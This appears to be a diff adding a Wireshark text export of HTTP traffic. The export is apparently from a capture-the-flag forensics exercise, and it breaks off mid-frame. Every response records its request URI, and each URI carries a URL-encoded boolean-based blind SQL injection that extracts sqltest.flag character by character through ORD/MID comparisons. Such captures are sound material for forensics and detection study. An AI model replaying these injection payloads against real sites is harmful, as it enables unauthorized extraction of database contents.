@@ -1,0 +1,1149 @@
+No.     Time           Source                Destination           Protocol Length Info
+    907 48.476665440   47.94.6.19            172.24.11.132         HTTP     1190   HTTP/1.1 200 OK  (text/html)
+
+Frame 907: 1190 bytes on wire (9520 bits), 1190 bytes captured (9520 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37794, Seq: 1, Ack: 368, Len: 1136
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:41 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 943\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.019355851 seconds]
+    [Request in frame: 904]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E64]
+    File Data: 943 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+    918 48.524442685   47.94.6.19            172.24.11.132         HTTP     1190   HTTP/1.1 200 OK  (text/html)
+
+Frame 918: 1190 bytes on wire (9520 bits), 1190 bytes captured (9520 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37800, Seq: 1, Ack: 368, Len: 1136
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:42 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 943\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.021050952 seconds]
+    [Request in frame: 916]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E96]
+    File Data: 943 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+    945 48.629989387   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 945: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37806, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:42 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.019238179 seconds]
+    [Request in frame: 943]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E100]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+    961 48.688080752   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 961: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37808, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:42 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.023304182 seconds]
+    [Request in frame: 958]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E101]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+    970 48.717420673   47.94.6.19            172.24.11.132         HTTP     1190   HTTP/1.1 200 OK  (text/html)
+
+Frame 970: 1190 bytes on wire (9520 bits), 1190 bytes captured (9520 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37810, Seq: 1, Ack: 368, Len: 1136
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:42 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 943\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.022477878 seconds]
+    [Request in frame: 967]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E96]
+    File Data: 943 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+    990 48.803087772   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 990: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37816, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:42 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.024232762 seconds]
+    [Request in frame: 988]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E104]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1006 48.860268430   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1006: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37818, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:42 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.023238984 seconds]
+    [Request in frame: 1003]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E106]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1017 48.905654268   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1017: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37822, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:42 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.019599654 seconds]
+    [Request in frame: 1015]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C2%2C1%29%29%3E107]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1024 48.935687295   47.94.6.19            172.24.11.132         HTTP     1190   HTTP/1.1 200 OK  (text/html)
+
+Frame 1024: 1190 bytes on wire (9520 bits), 1190 bytes captured (9520 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37820, Seq: 1, Ack: 368, Len: 1136
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:42 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 943\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.023816746 seconds]
+    [Request in frame: 1021]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C3%2C1%29%29%3E96]
+    File Data: 943 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1082 49.156917951   47.94.6.19            172.24.11.132         HTTP     1190   HTTP/1.1 200 OK  (text/html)
+
+Frame 1082: 1190 bytes on wire (9520 bits), 1190 bytes captured (9520 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37832, Seq: 1, Ack: 368, Len: 1136
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:42 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 943\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.024432873 seconds]
+    [Request in frame: 1077]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E96]
+    File Data: 943 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1109 49.260107043   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1109: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37842, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:42 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.020548862 seconds]
+    [Request in frame: 1107]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E100]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1116 49.290806900   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1116: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37840, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:42 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.024086285 seconds]
+    [Request in frame: 1113]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C4%2C1%29%29%3E102]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1136 49.364988175   47.94.6.19            172.24.11.132         HTTP     1190   HTTP/1.1 200 OK  (text/html)
+
+Frame 1136: 1190 bytes on wire (9520 bits), 1190 bytes captured (9520 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37848, Seq: 1, Ack: 368, Len: 1136
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:42 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 943\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.020278256 seconds]
+    [Request in frame: 1134]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E96]
+    File Data: 943 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1143 49.394297347   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1143: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37846, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:42 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.022770816 seconds]
+    [Request in frame: 1140]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E112]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1152 49.420158700   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1152: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37850, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:42 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.019945312 seconds]
+    [Request in frame: 1149]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E120]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1172 49.498629612   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1172: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37856, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.021263210 seconds]
+    [Request in frame: 1170]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C5%2C1%29%29%3E122]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1188 49.552994560   47.94.6.19            172.24.11.132         HTTP     1190   HTTP/1.1 200 OK  (text/html)
+
+Frame 1188: 1190 bytes on wire (9520 bits), 1190 bytes captured (9520 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37858, Seq: 1, Ack: 368, Len: 1136
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 943\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.021967475 seconds]
+    [Request in frame: 1185]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C6%2C1%29%29%3E64]
+    File Data: 943 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1197 49.583994432   47.94.6.19            172.24.11.132         HTTP     1190   HTTP/1.1 200 OK  (text/html)
+
+Frame 1197: 1190 bytes on wire (9520 bits), 1190 bytes captured (9520 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37860, Seq: 1, Ack: 368, Len: 1136
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 943\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.021266849 seconds]
+    [Request in frame: 1194]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C6%2C1%29%29%3E96]
+    File Data: 943 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1208 49.635275540   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1208: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37864, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.021974389 seconds]
+    [Request in frame: 1206]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C6%2C1%29%29%3E112]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1235 49.737851403   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1235: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37870, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.018441432 seconds]
+    [Request in frame: 1233]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C6%2C1%29%29%3E114]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1251 49.792632517   47.94.6.19            172.24.11.132         HTTP     1190   HTTP/1.1 200 OK  (text/html)
+
+Frame 1251: 1190 bytes on wire (9520 bits), 1190 bytes captured (9520 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37872, Seq: 1, Ack: 368, Len: 1136
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 943\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.019077532 seconds]
+    [Request in frame: 1248]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C7%2C1%29%29%3E96]
+    File Data: 943 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1262 49.842883594   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1262: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
